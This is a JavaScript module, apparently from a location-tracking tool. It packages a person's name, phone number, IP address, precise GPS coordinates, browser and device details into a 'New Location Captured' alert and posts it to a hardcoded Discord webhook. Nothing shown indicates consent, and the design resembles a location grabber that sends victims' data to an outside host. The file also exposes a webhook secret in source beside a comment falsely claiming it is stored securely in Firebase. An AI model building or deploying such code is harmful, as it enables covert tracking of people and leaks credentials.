import { logger } from '../../utils/logger.js';

// Discord webhook URL - stored in Firebase for security
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1550010848892944486/eezYf1HGQIgYLyPDEyMYFTpP088F_IAAA7f5JiJvxi-btm7JDdNugj-Y7H-MSSVl1cdS';

// Send a Discord notification when a new location is received
export async function sendLocationNotification(locationData) {
    try {
        if (!DISCORD_WEBHOOK_URL) {
            logger.warn('Discord webhook URL not configured');
            return;
        }

        const accuracy = locationData.accuracy ? `±${Math.round(locationData.accuracy)}m` : 'Unknown';
        const source = locationData.locationSource || 'Unknown';
        const timestamp = locationData.timestamp ? new Date(locationData.timestamp).toLocaleString() : 'Unknown';
        
        // Build user details
        const userName = [locationData.firstName, locationData.lastName].filter(Boolean).join(' ') || 'Not provided';
        const phone = locationData.phone || 'Not provided';
        
        // Build device info
        const browser = locationData.browser?.name || 'Unknown';
        const browserVersion = locationData.browser?.version || '';
        const platform = locationData.device?.platform || 'Unknown';
        const os = `${platform}`;
        
        // Google Maps link
        const mapsLink = locationData.latitude && locationData.longitude
            ? `https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}`
            : null;

        // Determine color based on accuracy
        let color = 0x808080; // grey
        if (locationData.accuracy) {
            if (locationData.accuracy < 50) color = 0x28a745; // green
            else if (locationData.accuracy < 200) color = 0x8bc34a; // light green
            else if (locationData.accuracy < 1000) color = 0xffc107; // yellow
            else color = 0xff5722; // orange
        }

        const embed = {
            title: '📍 New Location Captured',
            color: color,
            fields: [
                {
                    name: '👤 User',
                    value: `${userName}\n📱 ${phone}`,
                    inline: true
                },
                {
                    name: '🌐 IP Address',
                    value: `\`${locationData.ip || 'Unknown'}\``,
                    inline: true
                },
                {
                    name: '🎯 Accuracy',
                    value: `${accuracy} (${source})`,
                    inline: true
                },
                {
                    name: '📍 Coordinates',
                    value: locationData.latitude && locationData.longitude
                        ? `${locationData.latitude.toFixed(6)}, ${locationData.longitude.toFixed(6)}`
                        : 'Not available',
                    inline: true
                },
                {
                    name: '🖥️ Device',
                    value: `${browser} ${browserVersion}\n${os}`,
                    inline: true
                },
                {
                    name: '⏰ Timestamp',
                    value: timestamp,
                    inline: true
                }
            ],
            footer: {
                text: `Status: ${locationData.status || 'active'}`
            },
            timestamp: locationData.timestamp ? new Date(locationData.timestamp).toISOString() : new Date().toISOString()
        };

        if (mapsLink) {
            embed.fields.push({
                name: '🗺️ View on Map',
                value: `[Open in Google Maps](${mapsLink})`
            });
        }

        const payload = {
            embeds: [embed],
            username: 'Location Tracker',
            avatar_url: 'https://maps.google.com/mapfiles/ms/icons/red-dot.png'
        };

        const response = await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });

        if (!response.ok) {
            throw new Error(`Discord API error: ${response.status}`);
        }

        logger.info('Discord notification sent successfully');
    } catch (error) {
        logger.error('Failed to send Discord notification:', error);
    }
}

// Send a test notification to verify the webhook works
export async function sendTestNotification() {
    try {
        const payload = {
            embeds: [{
                title: '✅ Location Tracker Connected',
                description: 'Discord notifications are working correctly. You will receive alerts when new locations are captured.',
                color: 0x28a745,
                timestamp: new Date().toISOString()
            }],
            username: 'Location Tracker',
            avatar_url: 'https://maps.google.com/mapfiles/ms/icons/red-dot.png'
        };

        const response = await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });

        if (!response.ok) {
            throw new Error(`Discord API error: ${response.status}`);
        }

        logger.info('Test notification sent');
        return true;
    } catch (error) {
        logger.error('Failed to send test notification:', error);
        return false;
    }
}